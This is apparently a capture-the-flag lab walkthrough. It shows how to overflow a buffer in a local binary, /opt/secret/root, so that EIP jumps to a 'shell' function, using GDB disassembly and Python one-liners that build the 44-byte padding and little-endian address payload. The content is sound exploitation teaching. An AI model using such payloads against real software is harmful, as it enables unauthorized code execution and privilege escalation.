Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.

![](https://imgur.com/Al8tCRy.jpg)

```
disassemble shell
```
![[Pasted image 20240328214910.png]]

What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!

Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408"

We can use python to do this, as it allows a nice way of converting.

Method 1 - Manual conversion:  

```
python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
``` 
![[Pasted image 20240328222204.png]]

will output the payload we want, but it requires manually converting to little endian

Method 2 - Struct:  

```
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
```
![[Pasted image 20240328222248.png]]

It requires importing a module but struct.pack allows us to automatically convert memory to little endian.

We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary  

```
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```
should provide you with this output.

![](https://imgur.com/ioTkGbB.jpg)

![[Pasted image 20240328222355.png]]


We did it!  

Answer the questions below

Woohoo!